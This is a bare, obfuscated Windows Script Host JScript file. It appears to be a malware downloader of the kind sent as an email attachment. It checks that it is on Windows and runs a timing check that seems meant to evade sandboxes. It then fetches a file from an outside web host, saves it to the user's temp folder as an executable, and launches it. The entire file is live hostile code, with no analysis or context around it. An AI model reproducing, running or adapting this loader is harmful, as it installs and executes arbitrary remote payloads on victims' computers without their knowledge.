var Jr = false;
var Hp = "CreateObject";
var I0 = function C() {return WScript[Hp]("WScript.Shell");}(), Tf = 11;
var D = "MSXML2.XMLHTTP";
var I = 2123213;
var Lg = 0;
function Q(e){I0["Run"](e, Lg, Lg);};
function Na(){return "" + D;};
function n(EU, l){Lg = Lg * 1; return EU - l;};
function zh(){return Hp;};
/*@cc_on
  @if (@_win32 || @_win64)
    Jr = true;
  @end
@*/
if (Jr)
{
var v = "";
function L0(){return 22;};
var Y = 0; var xi = 0;
function L()
{
var q = new this["Date"]();
var P = q["getUTCMilliseconds"]();
WScript["Sleep"](L0());
var q = new this["Date"]();
var BI = q["getUTCMilliseconds"]();
WScript["Sleep"](L0());
var q = new this["Date"]();
var U = q["getUTCMilliseconds"]();
var Y = "WE";
Y = n(BI, P);
var xi = "i";
xi = n(U, BI);
v = "open";
return n(Y, xi);
}
var O = false;
var Dj = false;
for (var y = Lg; y < L0() * 1; y++){if (L() != Lg){
O = true; 
xi = "31" + 11 * Y + xi; 
Dj = true; 
break;
}}
function fc() {return ((O == true) && (O == Dj)) ? 1 : Lg;};
if (O && fc() && Dj){
function b() {return I0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "TaoQiS6qnRXN.exe";};
 Y0 = Na();
 G0 = WScript[Hp](Y0);
 var Wr = 1;
 while (Wr){
try {
G0[v]("GET", "http://www.aluguerdiadema.com/p9wsld", false);
G0["send"]();
IN = "Sleep";
for (;;){WScript[IN](L0() * 11); if (G0["readystate"] >= 2 * 2) break;};
Wr = Lg;
} catch(hO){};
}
function j(E) {var Ps = (1, 2, 3, 4, 5, E); return Ps;};
rC = WScript[zh()]("ADODB.Stream");
Y0 = rC;
Y0[v]();
Y0["type"] = j(1);
Y0["write"](G0["ResponseBody"]);
rC["position"] = j(Lg);
Y0["Save" + "ToFile"](b(), 2);
rC["c"+"lose"]();
G = b();
Q(G);
}
}

